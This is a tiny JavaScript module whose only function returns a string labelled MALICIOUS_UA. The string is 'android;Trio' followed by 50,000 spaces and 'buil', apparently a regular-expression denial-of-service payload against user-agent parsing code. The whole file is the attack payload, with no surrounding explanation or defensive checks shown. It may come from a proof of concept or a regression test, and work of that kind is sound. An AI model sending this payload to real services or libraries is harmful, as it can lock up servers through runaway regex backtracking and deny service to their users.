function getPayload() {
    const N_SIZE = 50000;
    const MALICIOUS_UA = `android;Trio${" ".repeat(N_SIZE)}buil`;
    return { MALICIOUS_UA };
}

module.exports = { getPayload };